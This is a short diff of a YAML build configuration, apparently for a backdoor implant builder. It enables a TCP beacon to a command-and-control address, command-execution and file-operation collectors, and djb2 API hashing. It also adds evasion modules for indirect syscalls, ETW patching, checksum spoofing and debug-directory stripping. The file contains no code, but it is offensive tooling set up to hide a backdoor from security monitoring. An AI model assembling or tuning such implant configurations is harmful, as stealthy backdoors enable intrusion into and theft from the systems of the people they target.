@@ -4,12 +4,19 @@ core:
 - core/emit_buffer
 - core/run_cmd
 - core/file_ops
-collectors: []
+collectors:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
 exfil: c2/tcp_beacon
 arch: arch/backdoor
 resources: true
-api_resolve: api_resolve/peb_walk
-evasion: []
+api_resolve: api_resolve/api_hash_djb2
+evasion:
+- evasion/indirect_syscall
+- evasion/etw_patch
+- evasion/checksum_spoof
+- evasion/debug_dir_strip
 vars:
   C2_IP: 10.0.2.2
   C2_PORT: '9001'
